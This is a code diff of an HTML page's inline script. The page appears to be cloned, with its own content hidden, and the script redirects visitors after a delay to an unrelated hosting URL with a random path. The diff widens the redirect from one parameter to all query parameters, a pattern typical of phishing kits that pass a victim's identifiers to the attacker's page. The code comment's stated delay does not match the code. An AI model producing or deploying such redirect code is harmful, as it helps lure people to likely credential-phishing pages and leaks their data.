@@ -46,25 +46,29 @@
   </style>
 
   <script>
-    function getFsyuikValue() {
+    function getQueryParams() {
         const urlParams = new URLSearchParams(window.location.search);
-        return urlParams.get('fsyuik'); // Get the value of the fsyuik parameter
+        return urlParams;
     }
 
     // JavaScript to simulate the 1-second delay before redirection
     setTimeout(function() {
-        const fsyuikValue = getFsyuikValue(); // Get the fsyuik value from the current URL
+        const urlParams = getQueryParams(); // Get all query parameters from the current URL
         const baseRedirectUrl = "https://styczynskamonikawppl.smarthost.pl/kyutiurtu85erwsjikh37y8rhw23e9puds/"; // Base redirect URL
-        
-        // Build the redirect URL based on the presence of fsyuik parameter
-        const redirectUrl = fsyuikValue 
-            ? `${baseRedirectUrl}/?fsyuik=${encodeURIComponent(fsyuikValue)}` 
+
+        // Create a new URLSearchParams object to append the current query parameters
+        const newParams = new URLSearchParams(urlParams);
+
+        // Build the full redirect URL with the query parameters appended
+        const redirectUrl = newParams.toString()
+            ? `${baseRedirectUrl}/?${newParams.toString()}`
             : baseRedirectUrl;
 
         // Redirect to the URL
         window.location.href = redirectUrl;
     }, 3000);
 </script>
+
 
 
 <div class="page-overview theme-dark" data-component-list="AllAccessPassL1 DeepLink FocusManager " style="display: none;">
